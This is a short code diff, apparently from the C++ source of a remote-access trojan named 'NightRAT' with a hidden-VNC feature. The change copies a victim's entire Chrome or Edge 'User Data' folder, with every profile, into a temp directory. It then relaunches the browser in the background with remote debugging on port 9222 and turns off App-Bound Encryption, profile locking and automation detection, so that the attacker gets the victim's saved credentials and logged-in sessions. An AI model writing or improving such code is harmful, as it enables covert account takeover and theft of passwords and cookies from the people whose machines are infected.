@@ -1191,22 +1191,25 @@ static void launch_browser_background(wstring browserName) {
     wchar_t localAppData[MAX_PATH];
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH)) {
         if (browserName == L"Google Chrome")
-            userDataPath = wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default";
+            userDataPath = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
         else
-            userDataPath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default";
+            userDataPath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
     }
 
-    wstring targetProfile = targetDir + L"\\Default";
     if (!userDataPath.empty()) {
-        copy_directory(userDataPath, targetProfile);
+        // SHFileOperationW copies the folder itself into the destination.
+        // If userDataPath is "...\User Data" and targetDir is "...\Temp\NightRAT_Profile_123"
+        // the result will be "...\Temp\NightRAT_Profile_123\User Data"
+        copy_directory(userDataPath, targetDir);
     }
 
-    // Modern hVNC için optimize edilmiş Chromium parametreleri
+    wstring targetUserData = targetDir + L"\\User Data";
+
+    // Modern hVNC için optimize edilmiş Chromium parametreleri (Tüm profiller ve Edge GUI fix)
     wstring args = L" --remote-debugging-port=9222"
                    L" --no-first-run"
                    L" --no-default-browser-check"
-                   L" --user-data-dir=\"" + targetDir + L"\""
-                   L" --profile-directory=\"Default\""
+                   L" --user-data-dir=\"" + targetUserData + L"\""
                    L" --disable-gpu"
                    L" --disable-gpu-compositing"
                    L" --disable-software-rasterizer"
@@ -1215,6 +1218,9 @@ static void launch_browser_background(wstring browserName) {
                    L" --disable-dev-shm-usage"
                    L" --disable-setuid-sandbox"
                    L" --force-cpu-draw"
+                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,msEdgeWelcomePage,msEdgeFirstRunExperience"
+                   L" --password-store=basic"
+                   L" --disable-blink-features=AutomationControlled"
                    L" --window-size=1280,720";
 
     wstring fullCmd = L"\"" + exePath + L"\"" + args;
